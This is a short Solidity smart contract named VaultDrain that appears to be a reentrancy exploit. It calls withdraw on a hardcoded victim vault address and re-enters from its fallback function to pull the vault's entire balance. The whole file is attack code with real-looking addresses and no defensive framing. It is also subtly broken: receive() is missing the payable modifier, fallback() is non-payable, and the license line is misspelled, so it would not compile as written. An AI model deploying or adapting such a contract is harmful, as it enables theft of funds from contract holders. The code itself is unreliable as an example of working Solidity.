// SPDX_LISENCE_IDENTIFIER: MIT
pragma solidity ^0.8.6;
interface Vault {
    function withdraw(uint256 _amount) external;
}

contract VaultDrain { // 0x9ef331424698F02345E5291EC6c4C6Bb00c74Df9
    address public immutable victim = 0xcf76B6324A20a432eb695ABDd5820bfBcdd34Bfd;
    uint256 internal constant INITIAL_WITHDRAWAL = 0.1 ether;
    function attack() public {
        Vault(victim).withdraw(INITIAL_WITHDRAWAL);
    }
    receive() external { }
    fallback() external {
        Vault(victim).withdraw(address(victim).balance);
    }
}